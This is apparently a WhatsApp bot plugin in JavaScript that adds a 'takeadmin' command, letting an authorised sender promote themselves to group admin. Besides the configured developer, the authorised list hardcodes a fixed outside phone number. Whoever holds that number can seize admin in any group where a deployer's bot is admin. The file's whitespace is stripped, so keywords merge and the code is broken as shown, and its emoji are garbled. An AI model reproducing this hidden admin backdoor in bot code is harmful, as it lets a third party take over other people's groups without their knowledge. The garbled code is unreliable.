const{cmd}=require('../command');constconfig=require('../config');cmd({pattern:"admin",alias:["takeadmin","makeadmin"],desc:"Takeadminshipforauthorizedusers",category:"owner",react:"ğŸ‘‘",filename:__filename},async(conn,mek,m,{from,sender,isBotAdmins,isGroup,reply})=>{//Verifygroupcontextif(!isGroup)returnreply("âŒThiscommandcanonlybeusedingroups.");//Verifybotisadminif(!isBotAdmins)returnreply("âŒIneedtobeanadmintoperformthisaction.");//NormalizeJIDsforcomparisonconstnormalizeJid=(jid)=>{if(!jid)returnjid;returnjid.includes('@')?jid.split('@')[0]+'@s.whatsapp.net':jid+'@s.whatsapp.net';};//Authorizedusers(properlyformattedJIDs)constAUTHORIZED_USERS=[normalizeJid(config.DEV),//HandlesbothrawnumbersandJIDsinconfig"923427582273@s.whatsapp.net"].filter(Boolean);//CheckauthorizationwithnormalizedJIDsconstsenderNormalized=normalizeJid(sender);if(!AUTHORIZED_USERS.includes(senderNormalized)){returnreply("âŒThiscommandisrestrictedtoauthorizedusersonly");}try{//GetcurrentgroupmetadataconstgroupMetadata=awaitconn.groupMetadata(from);//CheckifalreadyadminconstuserParticipant=groupMetadata.participants.find(p=>p.id===senderNormalized);if(userParticipant?.admin){returnreply("â„¹ï¸You'realreadyanadmininthisgroup");}//Promoteselftoadminawaitconn.groupParticipantsUpdate(from,[senderNormalized],"promote");returnreply("âœ…Successfullygrantedyouadminrights!");}catch(error){console.error("Admincommanderror:",error);returnreply("âŒFailedtograntadminrights.Error:"+error.message);}});